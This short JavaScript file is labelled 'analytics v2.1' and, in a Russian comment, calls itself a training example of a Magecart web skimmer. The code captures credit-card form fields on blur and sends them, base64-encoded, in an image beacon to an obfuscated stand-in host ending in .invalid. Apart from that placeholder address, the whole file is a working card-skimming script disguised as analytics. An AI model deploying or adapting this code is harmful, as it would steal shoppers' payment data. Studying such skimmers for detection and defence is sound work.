/* analytics v2.1 — учебный пример веб-скиммера (Magecart). Никуда реально не отправляет: адрес .invalid не существует. */
(function () {
  var d = {};
  var u = atob('aHR0cHM6Ly9zdGF0aWMtY2RuLW1ldHJpY3MuaW52YWxpZC9wLmdpZg==');
  document.querySelectorAll('input[autocomplete^="cc-"]').forEach(function (el) {
    el.addEventListener('blur', function () {
      d[el.name] = el.value;
      new Image().src = u + '?d=' + btoa(JSON.stringify(d));
    });
  });
})();
